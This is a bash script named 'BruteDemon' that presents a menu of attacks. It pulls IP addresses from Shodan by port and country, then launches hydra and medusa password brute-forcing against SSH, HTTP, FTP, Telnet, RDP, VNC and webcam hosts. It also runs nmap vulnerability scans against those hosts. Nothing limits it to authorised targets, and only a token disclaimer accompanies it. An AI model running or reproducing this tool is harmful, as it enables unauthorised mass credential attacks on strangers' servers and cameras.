#!/bin/bash
figlet -w 100 BruteDemon
echo "BruteDemon Initializing now"
echo "Please use this responsibly"
echo "I am not responsible for any bad decisions you make"


PS3='Choose your attack: '
attack=("SSH-Brute" "HTTP-Brute" "FTP-Brute" "NMAP" "TELNET" "WEBCAMXP" "RDP-BRUTE" "VNC-BRUTE" "Random-Search")
select atk in "${attack[@]}"; do
    case $atk in
        "SSH-Brute")
            echo "You have chosen $atk!"

/bin/sleep 5
echo "Enter Shodan API-Key"
read -p'API:' uservar

echo "Enter 2 letter Country code.....info@https://www.nationsonline.org/oneworld/country_code_list.htm"
read -p'Country Code:' countvar

echo "Enter absolute path to username list ex: /usr/share/wordlists/..etc"
read -p'path to Username list:' ulvar


echo "Enter absolute path to passwordlist ex: /usr/share/wordlists/...etc"
read -p'Password list:' pwvar

echo "SSH-Brute Initializing"
shodan init $uservar

## utilizes shodan search function to find port 22 and greps usable ipaddresses and outputs to file
shodan search Port:22 Country:$countvar | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' > $1 ;
sort $1 | uniq -u > $2

 wc -l < $2 && echo "SSH Targets Loaded"

/bin/sleep 5
echo "Targets in Range!"
/bin/sleep 5
echo "Launch Sequence starting soon..."
echo "Abort Now if You're Scared!"

/bin/sleep 5
read -rsn1 -p"Last Chance To abort,Press any key to continue" variable;echo

##countdown function
seconds=10; date1=$((`date +%s` + $seconds));
while [ "$date1" -ge `date +%s` ]; do
  echo -ne "$(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r";
done

##notifiers##
read -rsn1 -p"You know what you signed up for,Press any key to continue" variable;echo
echo "Launching Now"

## hydra command,if not working change absolute paths to username list and password list##
hydra -L $ulvar -P $pwvar -M $2 -o $2 -t 4 ssh
##outputs file to current directory#
echo "File saved in: ${PWD}"
            ;;
        "HTTP-Brute")
            echo "You have chose $atk!"
	    echo "HTTP-Brute in progress"
/bin/sleep 5
echo "Enter Shodan API-Key"
read -p'API:' uservar
/bin/sleep 5
echo "Enter 2 letter Country code.....info@https://www.nationsonline.org/oneworld/country_code_list.htm"
read -p'Country Code:' countvar

echo "Enter absolute path to username list ex: /usr/share/wordlists/..etc"
read -p'path to Username list:' ulvar


echo "Enter absolute path to passwordlist ex: /usr/share/wordlists/...etc"
read -p'Password list:' pwvar

echo "HTTP Targets Initializing" 
shodan init $uservar
## utilizes shodan search function to find port 22 and greps usable ipaddresses and outputs to file
shodan search Port:80, login, Country:$countvar,200 | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' > $1 ;
sort $1 | uniq -u > $2

 wc -l < $2 && echo "HTTP Targets Loaded"

/bin/sleep 5
echo "HTTP Targets in Range!"
/bin/sleep 5
echo "Launch Sequence starting soon..."
echo "Abort Now if You're Scared!"

/bin/sleep 5
read -rsn1 -p"Last Chance To abort,Press any key to continue" variable;echo

##countdown function
seconds=3; date1=$((`date +%s` + $seconds));
while [ "$date1" -ge `date +%s` ]; do
  echo -ne "$(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r";
done

##notifiers##
read -rsn1 -p"You know what you signed up for,Press any key to continue" variable;echo
echo "Launching Now"

## hydra command,if not working change absolute paths to username list and password list##
hydra -vV -M $2 http-post-form "/w3af/bruteforce/form_login/dataReceptor.php:user=^USER^&pass=^PASS^:Bad login" -L $ulvar -P $pwvar -t 10 -w 30 -o $1
##outputs file to current directory#
echo "File saved in: ${PWD}"
            ;;
        "FTP-Brute")
            echo "You have chosen $atk!"
	    #FTP NEW!
## asks for API Key for shodan
/bin/sleep 5
echo "FTP-Brute in progress"
/bin/sleep 5
echo "Enter Shodan API-Key"
read -p'API:' uservar
echo "Enter 2 letter Country code.....info@https://www.nationsonline.org/oneworld/country_code_list.htm"
read -p'Country Code:' countvar

echo "Enter absolute path to username list ex: /usr/share/wordlists/..etc"
read -p'path to Username list:' ulvar


echo "Enter absolute path to passwordlist ex: /usr/share/wordlists/...etc"
read -p'Password list:' pwvar

echo "FTP Targets Initializing"
shodan init $uservar
## utilizes shodan search function to find port 22 and greps usable ipaddresses and outputs to file
shodan search Port:21, login, Country:$countvar, 200 | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' > $1 ;
sort $1 | uniq -u > $2

 wc -l < $2 && echo "FTP Targets Loaded"

/bin/sleep 5
echo "FTP Targets in Range!"
/bin/sleep 5
echo "Launch Sequence starting soon..."
echo "Abort Now if You're Scared!"
/bin/sleep 10
read -rsn1 -p"Last Chance To abort,Press any key to continue" variable;echo

##countdown function
seconds=10; date1=$((`date +%s` + $seconds));
while [ "$date1" -ge `date +%s` ]; do
  echo -ne "$(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r";
done

##notifiers##
read -rsn1 -p"You know what you signed up for,Press any key to continue" variable;echo
echo "Launching Now"

## hydra command,if not working change absolute paths to username list and password list##
hydra -L $ulvar -vV -P $pwvar ftp -M $2 -O $1 -vV
##outputs file to current directory#
echo "File saved in: ${PWD}"
            ;;
"NMAP")
echo "You have chosen $atk!"
read -p'Enter Port#:' port
read -p'Enter Country Code:' $countvar
echo "Enter Shodan API-Key"
read -p'API:' uservar
shodan init $uservar
wc -l < $1 && echo "Addresses found"
shodan search Port:$port,Country:$countvar | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' > $1 ;
sort $1 | uniq -u > $2
nmap -sS -sV --script=vuln -iL $2 -oN $1 -vv
echo "File saved in: ${PWD}"
  ;;
"TELNET")
figlet -w 100 TNETDemon

            echo "You have chosen $atk!"

/bin/sleep 5
echo "Enter Shodan API-Key"
read -p'API:' uservar

echo "Enter 2 letter Country code.....info@https://www.nationsonline.org/oneworld/country_code_list.htm"
read -p'Country Code:' countvar

echo "Enter absolute path to username list ex: /usr/share/wordlists/rockyou.txt."
read -p'path to Username list:' ulvar


echo "Enter absolute path to passwordlist ex: /usr/share/wordlists/rockyou.txt."
read -p'Password list:' pwvar

echo "TELNET-BRUTE Initializing"
shodan init $uservar

## utilizes shodan search function to find port 22 and greps usable ipaddresses and outputs to file
shodan search Port:23 Country:$countvar | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' > $1 ;
sort $1 | uniq -u > $2

 wc -l < $2 && echo "Telnet Targets Loaded"

/bin/sleep 5
echo "Targets in Range!"
/bin/sleep 5
echo "Launch Sequence starting soon..."
echo "Abort Now if You're Scared!"

/bin/sleep 5
read -rsn1 -p"Last Chance To abort,Press any key to continue" variable;echo

##countdown function
seconds=3; date1=$((`date +%s` + $seconds));
while [ "$date1" -ge `date +%s` ]; do
  echo -ne "$(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r";
done

##notifiers##
read -rsn1 -p"You know what you signed up for,Press any key to continue" variable;echo
echo "Launching Now"

## hydra command,if not working change absolute paths to username list and password list##
#hydra -L $ulvar -P $pwvar -M $2 -o $2  rdp -vV
#crowbar -U $ulvar -C $pwvar -S $2 --brute rdp --output $1
medusa -U $ulvar -P $pwvar -H $2 -f -M telnet -v 6 -O $1
##outputs file to current directory#
echo "File saved in: ${PWD}"

  ;;
"WEBCAMXP")
echo "You have chosen $atk!"
echo "Enter Shodan API-Key"
read -p'API:' uservar

echo "Enter 2 letter Country code.....info@https://www.nationsonline.org/oneworld/country_code_list.htm"
read -p'Country Code:' countvar

echo "Enter absolute path to username list ex: /usr/share/wordlists/..etc"
read -p'path to Username list:' ulvar


echo "Enter absolute path to passwordlist ex: /usr/share/wordlists/...etc"
read -p'Password list:' pwvar

echo "WEBCAMXP Initializing"
shodan init $uservar

## utilizes shodan search function to find port 22 and greps usable ipaddresses and outputs to file
shodan search webcamxp, Country:$countvar | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' > $1 ;
sort $1 | uniq -u > $2

 wc -l < $2 && echo "WEBCAMXP Targets loaded"

echo "Targets in Range!"
echo "Launch Sequence starting soon..."
echo "Abort Now if You're Scared!"

/bin/sleep 5
read -rsn1 -p"Last Chance To abort,Press any key to continue" variable;echo
##countdown function
seconds=5; date1=$((`date +%s` + $seconds));
while [ "$date1" -ge `date +%s` ]; do
echo -ne "$(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r";
done
##notifiers##
read -rsn1 -p"You know what you signed up for,Press any key to continue" variable;echo
echo "Launching Now"

## hydra command,if not working change absolute paths to username list and password list##
##error in bruteforce login command ##
hydra -vV -M $2 http-form-post "/w3af/bruteforce/form_login/dataReceptor.php:user=^USER^&pass=^PASS^:Bad login" -L $ulvar -P $pwvar -t 10 -w 30 -o $1
##outputs file to current directory#
echo "File saved in: ${PWD}"
  ;;
#RDP NEW ADDTION 2/11/21
        "RDP-BRUTE")
figlet -w 100 RDPDemon

            echo "You have chosen $atk!"

/bin/sleep 5
echo "Enter Shodan API-Key"
read -p'API:' uservar

echo "Enter 2 letter Country code.....info@https://www.nationsonline.org/oneworld/country_code_list.htm"
read -p'Country Code:' countvar

echo "Enter absolute path to username list ex: /usr/share/wordlists/rockyou.txt."
read -p'path to Username list:' ulvar


echo "Enter absolute path to passwordlist ex: /usr/share/wordlists/rockyou.txt."
read -p'Password list:' pwvar

echo "RDP-BRUTE Initializing"
shodan init $uservar

## utilizes shodan search function to find port 22 and greps usable ipaddresses and outputs to file
shodan search Port:3389 Country:$countvar | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' > $1 ;
sort $1 | uniq -u > $2

 wc -l < $2 && echo "RDP Targets Loaded"

/bin/sleep 5
echo "Targets in Range!"
/bin/sleep 5
echo "Launch Sequence starting soon..."
echo "Abort Now if You're Scared!"

/bin/sleep 5
read -rsn1 -p"Last Chance To abort,Press any key to continue" variable;echo

##countdown function
seconds=3; date1=$((`date +%s` + $seconds));
while [ "$date1" -ge `date +%s` ]; do
  echo -ne "$(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r";
done

##notifiers##
read -rsn1 -p"You know what you signed up for,Press any key to continue" variable;echo
echo "Launching Now"

## hydra command,if not working change absolute paths to username list and password list##
#hydra -L $ulvar -P $pwvar -M $2 -o $2  rdp -vV
#crowbar -U $ulvar -C $pwvar -S $2 --brute rdp --output $1
medusa -U $ulvar -P $pwvar -H $2 -f -M rdp
##outputs file to current directory#
echo "File saved in: ${PWD}"
  ;;
#VNC ADDITION
        "VNC-BRUTE")
figlet -w 100 VNCDemon

            echo "You have chosen $atk!"

/bin/sleep 5
echo "Enter Shodan API-Key"
read -p'API:' uservar

echo "Enter 2 letter Country code.....info@https://www.nationsonline.org/oneworld/country_code_list.htm"
read -p'Country Code:' countvar

echo "Enter absolute path to username list ex: /usr/share/wordlists/rockyou.txt."
read -p'path to Username list:' ulvar


echo "Enter absolute path to passwordlist ex: /usr/share/wordlists/rockyou.txt."
read -p'Password list:' pwvar

echo "VNC-BRUTE Initializing"
shodan init $uservar

## utilizes shodan search function to find port 22 and greps usable ipaddresses and outputs to file
shodan search port:5900 product:"VNC" Country:$countvar | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' > $1 ;
sort $1 | uniq -u > $2


wc -l < $2 && echo "VNC Targets Loaded"

/bin/sleep 5
echo "Targets in Range!"
/bin/sleep 5
echo "Launch Sequence starting soon..."
echo "Abort Now if You're Scared!"

/bin/sleep 5
read -rsn1 -p"Last Chance To abort,Press any key to continue" variable;echo

##countdown function
seconds=3; date1=$((`date +%s` + $seconds));
while [ "$date1" -ge `date +%s` ]; do
  echo -ne "$(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r";
done

##notifiers##
read -rsn1 -p"You know what you signed up for,Press any key to continue" variable;echo
echo "Launching Now"

## Medusa##
medusa -U $ulvar -P $pwvar -H $2 -f -M vnc -O $1 -v 5

##outputs file to current directory#
echo "File saved in: ${PWD}"
  ;;
#Random Search Addition
        "Random-Search")

figlet -w 100 Random

            echo "You have chosen $atk!"

/bin/sleep 5
echo "Enter Shodan API-Key"
read -p'API:' uservar
echo "Enter port Number"
read -p'port:' port
echo "Enter Service"
read -p'Service:' service
echo "Enter 2 letter Country code.....info@https://www.nationsonline.org/oneworld/country_code_list.htm"
read -p'Country Code:' countvar


echo "Random-Search Initializing"
shodan init $uservar

## utilizes shodan search function to find port 22 and greps usable ipaddresses and outputs to file
shodan search port:$port $service Country:$countvar | grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' > $1 ;
sort $1 | uniq -u > $2


wc -l < $2 && echo "IP's Loaded"
echo "what do you want to do with this info?"

PS3='Please enter your choice: '
options=("Enumerate" "Brute-Force" "Whois" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Enumerate")
            echo "you chose Enumerate"
read -p"What do you want to name the file?" fname

nmap -sS -sV -iL $2 -oN $fname -p $port --script=vuln -v  
echo "File saved in: ${PWD} as $fname"

            ;;
        "Brute-Force")
            echo "you chose Brute-Force"
read -p"Enter username list absolute path:" ulname 
read -p"Enter password list absolute path:" pwlist
#medusa -U $ulname -P $pwlist -H $2 -f -M $service -O $1 -v 6
hydra -L $ulname -vV -P $pwlist $service -M $2 -O $1 -vV
            ;;
        "Whois")
            echo "you chose choice $REPLY which is $opt"
            ;;
        "Quit")
            break
            ;;
        *) echo "invalid option $REPLY";;
    esac
done
echo "File Stored in ${pwd}"



    esac
done
